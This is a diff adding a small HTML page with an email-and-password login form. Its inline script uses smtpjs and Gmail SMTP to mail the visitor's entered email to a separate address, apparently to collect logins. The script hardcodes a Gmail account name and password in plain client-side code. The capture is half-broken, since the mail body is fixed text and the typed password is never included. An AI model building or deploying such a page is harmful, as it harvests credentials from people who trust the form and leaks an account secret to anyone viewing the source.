@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maruf</title>
+    <link rel="stylesheet" href="input.css">
+</head>
+<body>
+    <h1>Hover Me</h1>
+    <div class="contanier">
+        <div class="header">
+            <form onsubmit="sendEmail(); reset(); return false;" >
+                <h3>User</h3>
+                <input type="email" id="email" placeholder="Enter your Email" required>
+                <h3>Password</h3>
+                <input type="Password" id="password" placeholder="Enter your password" required>
+                <button type="submit">Send</button>
+            </form>
+              
+           
+        </div>
+    </div>
+    <p>Created By Maruf Rahman &copy</p>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function sendEmail(){
+            Email.send({
+            Host : "smtp.gmail.com",
+            Username : "marufabidurrahman76@gmail.com",
+            Password : "787898689012M",
+            To : 'armaruf450@gmail.com',
+            From : document.getElementById("email").value,
+            Subject : "Email adress",
+            Body : "Email adress password"
+        }).then(
+        message => alert(message)
+        );
+        }
+    </script>
+</body>
+</html>
